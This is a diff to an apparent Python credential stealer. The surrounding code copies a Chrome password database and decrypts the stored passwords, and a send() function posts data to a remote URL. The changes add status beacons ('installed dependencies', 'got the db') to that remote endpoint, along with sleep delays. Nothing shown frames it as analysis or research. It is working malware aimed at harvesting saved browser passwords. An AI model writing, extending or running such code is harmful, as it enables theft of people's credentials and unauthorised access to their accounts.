@@ -2,6 +2,7 @@ from datetime import timezone, datetime, timedelta
 import subprocess
 import sqlite3
 import shutil
+import time
 import base64
 import json
 import os
@@ -49,7 +50,8 @@ def send(text):
 
     r = requests.post(url, json=payload)
     return r
-
+send("installed dependencies")
+time.sleep(60)
 
 def temp_store(mode, data=None):
     if mode == "write":
@@ -81,7 +83,8 @@ def password_decryption(password, encryption_key):
 def getcredt(dbpath, keypath):
     filename = "ChromePasswords.db"
     shutil.copyfile(dbpath, filename)
-
+    time.sleep(10)
+    send("got the db")
     db = sqlite3.connect(filename)
     cursor = db.cursor()
 
